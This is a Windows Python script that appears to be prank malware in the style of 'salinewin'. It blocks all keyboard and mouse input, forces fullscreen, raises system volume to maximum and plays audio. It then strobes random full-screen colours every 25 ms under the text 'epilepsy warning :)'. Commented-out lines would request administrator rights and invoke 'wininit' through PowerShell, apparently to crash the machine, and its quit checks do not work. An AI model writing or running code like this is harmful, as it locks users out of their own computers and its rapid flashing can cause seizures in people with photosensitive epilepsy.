import pygame
import playsound
import random
import ctypes
from ctypes import wintypes, cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from time import sleep
import subprocess
import sys
import pyautogui
import threading
#ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
pygame.init()

MUSIC = "salinewin.wav"
screen = pygame.display.set_mode((1920,1200))
pygame.display.toggle_fullscreen()
pygame.mixer_music.load(MUSIC)

font = pygame.font.Font("zhcn.ttf",140)
BlockInput = ctypes.windll.user32.BlockInput
BlockInput.argtypes = [wintypes.BOOL]
BlockInput.restype = wintypes.BOOL
BlockInput(True)
pyautogui.FAILSAFE= False

screen.fill((0,0,0))
txt = font.render("epilepsy warning :)",True,(50,50,50))
textRect = txt.get_rect()

textRect.center = (1920 // 2, 1200 // 2)
screen.blit(txt,textRect)
pygame.display.update()     
sleep(1)

devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(IAudioEndpointVolume._iid_,CLSCTX_ALL,None)
volume = cast(interface,POINTER(IAudioEndpointVolume))
volume.SetMasterVolumeLevel(0.0,None)
pygame.mixer_music.play()



while True:
    
    if pygame.mixer_music.get_busy() == False:
        #subprocess.call(["powershell","-Command","wininit"])
        break
    events = pygame.event.get()
    for e in events:
        if e == pygame.QUIT:

            break
    screen.fill((random.randint(0,255),random.randint(0,255),random.randint(0,255)))
    txt = font.render("epilepsy warning :)",True,(random.randint(0,255),random.randint(0,255),random.randint(0,255)))
    textRect = txt.get_rect()

 
    textRect.center = (random.randint(700,1220),random.randint(340,860))
    screen.blit(txt,textRect)
    pygame.display.update()
    sleep(0.025)

while True:
    
    if pygame.mixer_music.get_busy() == False:
        #subprocess.call(["powershell","-Command","wininit"])
        break
    events = pygame.event.get()
    for e in events:
        if e == pygame.QUIT: 

            break
    screen.fill((random.randint(0,255),random.randint(0,255),random.randint(0,255)))
    txt = font.render("epilepsy warning :)",True,(random.randint(0,255),random.randint(0,255),random.randint(0,255)))
    textRect = txt.get_rect()

    textRect.center = (random.randint(900,1020),random.randint(540,660))
    screen.blit(txt,textRect)
    pygame.display.update()
    sleep(0.025)

while True:
    
    if pygame.mixer_music.get_busy() == False:
        #subprocess.call(["powershell","-Command","wininit"])
        break
    events = pygame.event.get()
    for e in events:
        if e == pygame.QUIT:

            break
    screen.fill((random.randint(0,255),random.randint(0,255),random.randint(0,255)))
    txt = font.render("epilepsy warning :)",True,(random.randint(0,255),random.randint(0,255),random.randint(0,255)))
    textRect = txt.get_rect()

    textRect.center = (random.randint(900,1020),random.randint(540,660))
    screen.blit(txt,textRect)
    pygame.display.update()
    sleep(0.025)
pygame.quit()